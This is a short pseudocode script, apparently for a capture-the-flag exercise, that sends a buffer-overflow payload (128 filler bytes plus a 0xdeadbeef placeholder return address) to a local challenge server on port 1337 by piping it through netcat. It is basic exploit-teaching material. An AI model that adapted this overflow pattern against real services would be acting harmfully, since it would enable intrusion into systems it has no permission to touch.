#  Connect to a challenge server and send a crafted payload

# Connect to the target
connect to "127.0.0.1" on port 1337

# Craft shellcode or overflow buffer
let buf = "A" * 128 + "\xef\xbe\xad\xde"  # Overflow + 0xdeadbeef RET

# Write payload to buffer
write buf to "fuzzed.bin"

# Send buffer via raw socket
run command "cat fuzzed.bin | nc 127.0.0.1 1337"
